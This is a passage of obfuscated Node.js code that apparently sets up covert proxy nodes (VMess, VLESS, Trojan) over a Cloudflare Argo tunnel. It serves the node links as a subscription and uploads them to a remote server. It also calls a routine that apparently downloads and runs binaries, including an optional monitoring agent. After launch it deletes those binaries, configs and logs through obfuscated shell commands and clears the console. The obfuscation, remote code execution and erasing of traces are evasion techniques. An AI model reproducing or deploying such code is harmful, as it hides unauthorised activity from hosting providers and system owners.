_0x29edcc[_0x3e58c1(_0xe58abc._0x32e7ae)][_0x3e58c1(_0xe58abc._0x2a422f)]+'_'+_0x29edcc[_0x3e58c1(_0xe58abc._0x5db95e)][_0x3e58c1(0xba)];}catch(_0x514239){try{const _0x199d65=await axios[_0x3e58c1(_0xe58abc._0x3ae251)](_0x3e58c1(0x160),{'timeout':0xbb8});if(_0x199d65[_0x3e58c1(0x129)]&&_0x199d65[_0x3e58c1(0x129)][_0x3e58c1(_0xe58abc._0x30a282)]===_0x3e58c1(_0xe58abc._0x3a4a5c)&&_0x199d65[_0x3e58c1(_0xe58abc._0x32e7ae)][_0x3e58c1(0xb8)]&&_0x199d65['data']['org'])return _0x199d65[_0x3e58c1(0x129)]['countryCode']+'_'+_0x199d65[_0x3e58c1(0x129)][_0x3e58c1(0xba)];}catch(_0x1df41b){}}return _0x3e58c1(_0xe58abc._0x2bbf42);}async function _0x51053c(_0x1042ea){const _0x4c8f8f=await _0x1555d3(),_0x5cfbb6=NAME?NAME+'-'+_0x4c8f8f:_0x4c8f8f;return new Promise(_0x2fcae3=>{const _0x1bc095={_0x5e625a:0x109,_0x3fd0e9:0x10a,_0x4e0e26:0x157,_0x231e64:0x128,_0xf90d60:0x123,_0x27c90e:0x151,_0xa26b72:0x123,_0x438801:0xe2},_0x473691={_0x39c096:0x123,_0x362ae0:0x147};setTimeout(()=>{const _0x4d176f=_0x4ac7,_0x9d0dcb={'v':'2','ps':''+_0x5cfbb6,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x4d176f(0xcb),'host':_0x1042ea,'path':'/vmess-argo?ed=2560','tls':_0x4d176f(0x104),'sni':_0x1042ea,'alpn':'','fp':_0x4d176f(0xe0)},_0x2c8cc8=_0x4d176f(_0x1bc095._0x5e625a)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x1042ea+'&fp=firefox&type=ws&host='+_0x1042ea+_0x4d176f(_0x1bc095._0x3fd0e9)+_0x5cfbb6+_0x4d176f(_0x1bc095._0x4e0e26)+Buffer['from'](JSON['stringify'](_0x9d0dcb))[_0x4d176f(0x151)]('base64')+'\x0a\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x4d176f(_0x1bc095._0x231e64)+_0x1042ea+_0x4d176f(0x13a)+_0x1042ea+_0x4d176f(0xe5)+_0x5cfbb6+_0x4d176f(0x11d);console[_0x4d176f(0x12e)](Buffer[_0x4d176f(_0x1bc095._0xf90d60)](_0x2c8cc8)[_0x4d176f(_0x1bc095._0x27c90e)](_0x4d176f(0xd0))),fs[_0x4d176f(0xd8)](subPath,Buffer[_0x4d176f(_0x1bc095._0xa26b72)](_0x2c8cc8)[_0x4d176f(_0x1bc095._0x27c90e)](_0x4d176f(0xd0))),console['log'](FILE_PATH+_0x4d176f(0x13f)),uploadNodes(),app[_0x4d176f(_0x1bc095._0x438801)]('/'+SUB_PATH,(_0x1c02b1,_0x39ecfd)=>{const _0x59f51d=_0x4d176f,_0x62e411=Buffer[_0x59f51d(_0x473691._0x39c096)](_0x2c8cc8)[_0x59f51d(0x151)]('base64');_0x39ecfd['set']('Content-Type',_0x59f51d(0x148)),_0x39ecfd[_0x59f51d(_0x473691._0x362ae0)](_0x62e411);}),_0x2fcae3(_0x2c8cc8);},0x7d0);});}}async function uploadNodes(){const _0x4b125e={_0x24e1fd:0x143,_0x1a8612:0xc7,_0x50f675:0x16e,_0x392e7a:0xd6,_0x407a7f:0x171,_0x3c4fef:0x110,_0x5930be:0xaf,_0x25fcb7:0x143,_0x21c987:0x12e},_0x3d5eda=_0x1b7f07;if(UPLOAD_URL&&PROJECT_URL){const _0xbb6fd6=PROJECT_URL+'/'+SUB_PATH,_0x566d6e={'subscription':[_0xbb6fd6]};try{const _0x1f8fd2=await axios[_0x3d5eda(_0x4b125e._0x24e1fd)](UPLOAD_URL+_0x3d5eda(0x141),_0x566d6e,{'headers':{'Content-Type':_0x3d5eda(_0x4b125e._0x1a8612)}});return _0x1f8fd2&&_0x1f8fd2[_0x3d5eda(0x171)]===0xc8?(console[_0x3d5eda(0x12e)](_0x3d5eda(_0x4b125e._0x50f675)),_0x1f8fd2):null;}catch(_0x44c912){if(_0x44c912[_0x3d5eda(_0x4b125e._0x392e7a)]){if(_0x44c912[_0x3d5eda(0xd6)][_0x3d5eda(_0x4b125e._0x407a7f)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x4735c0=fs[_0x3d5eda(0x16f)](listPath,_0x3d5eda(_0x4b125e._0x3c4fef)),_0x2f8b67=_0x4735c0['split']('\x0a')[_0x3d5eda(0xdb)](_0x496367=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x496367));if(_0x2f8b67[_0x3d5eda(_0x4b125e._0x5930be)]===0x0)return;const _0x100be0=JSON['stringify']({'nodes':_0x2f8b67});try{const _0x5231d5=await axios[_0x3d5eda(_0x4b125e._0x25fcb7)](UPLOAD_URL+'/api/add-nodes',_0x100be0,{'headers':{'Content-Type':_0x3d5eda(_0x4b125e._0x1a8612)}});return _0x5231d5&&_0x5231d5[_0x3d5eda(0x171)]===0xc8?(console[_0x3d5eda(_0x4b125e._0x21c987)](_0x3d5eda(0x153)),_0x5231d5):null;}catch(_0x316640){return null;}}else return;}}function cleanFiles(){const _0x474b6e={_0x2f206c:0x11a,_0x399358:0xf8,_0x95d0bf:0xbf,_0x3d1b83:0x127,_0x55d06a:0x101,_0x3ce48e:0xcf};setTimeout(()=>{const _0x1cc703={_0x13006a:0xb1},_0x26ca4f={_0x359a96:0x12e,_0x12c5f2:0x155},_0x10f3ad=_0x4ac7,_0x5db683=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x5db683[_0x10f3ad(_0x474b6e._0x2f206c)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x5db683[_0x10f3ad(0x11a)](phpPath);process[_0x10f3ad(_0x474b6e._0x399358)]===_0x10f3ad(_0x474b6e._0x95d0bf)?exec(_0x10f3ad(0xbb)+_0x5db683['join']('\x20')+_0x10f3ad(_0x474b6e._0x3d1b83),_0x5b92ff=>{const _0x51f903=_0x10f3ad;console['clear'](),console[_0x51f903(0x12e)](_0x51f903(0xb1)),console[_0x51f903(_0x26ca4f._0x359a96)](_0x51f903(_0x26ca4f._0x12c5f2));}):exec(_0x10f3ad(_0x474b6e._0x55d06a)+_0x5db683[_0x10f3ad(_0x474b6e._0x3ce48e)]('\x20')+_0x10f3ad(0xcc),_0x4f7bc4=>{const _0x39eee9=_0x10f3ad;console['clear'](),console[_0x39eee9(0x12e)](_0x39eee9(_0x1cc703._0x13006a)),console[_0x39eee9(0x12e)](_0x39eee9(0x155));});},0x15f90);}function _0x4ac7(_0x255a5b,_0x216040){const _0x43e62=_0x43e6();return _0x4ac7=function(_0x4ac700,_0x50a8ba){_0x4ac700=_0x4ac700-0xa8;let _0xdf6992=_0x43e62[_0x4ac700];return _0xdf6992;},_0x4ac7(_0x255a5b,_0x216040);}cleanFiles();async function AddVisitTask(){const _0x1b8574={_0xc9269f:0x143,_0x3a6a59:0x16c,_0x50781a:0xc7,_0xcac1e5:0x12e,_0x3846dc:0x16a,_0x269f31:0xf7},_0x2248c9=_0x1b7f07;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x2248c9(0x12e)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x5cfa2d=await axios[_0x2248c9(_0x1b8574._0xc9269f)](_0x2248c9(_0x1b8574._0x3a6a59),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x2248c9(_0x1b8574._0x50781a)}});return console[_0x2248c9(_0x1b8574._0xcac1e5)](_0x2248c9(_0x1b8574._0x3846dc)),_0x5cfa2d;}catch(_0x29328c){return console[_0x2248c9(_0x1b8574._0x269f31)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x29328c[_0x2248c9(0xce)]),null;}}async function startserver(){const _0x3a0dd6=_0x1b7f07;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x464cef){console[_0x3a0dd6(0xf7)]('Error\x20in\x20startserver:',_0x464cef);}}startserver()[_0x1b7f07(0x105)](_0x28fb80=>{const _0x5978c0=_0x1b7f07;console[_0x5978c0(0xf7)]('Unhandled\x20error\x20in\x20startserver:',_0x28fb80);}),app[_0x1b7f07(0xb2)](PORT,()=>console['log'](_0x1b7f07(0x11b)+PORT+'!'));
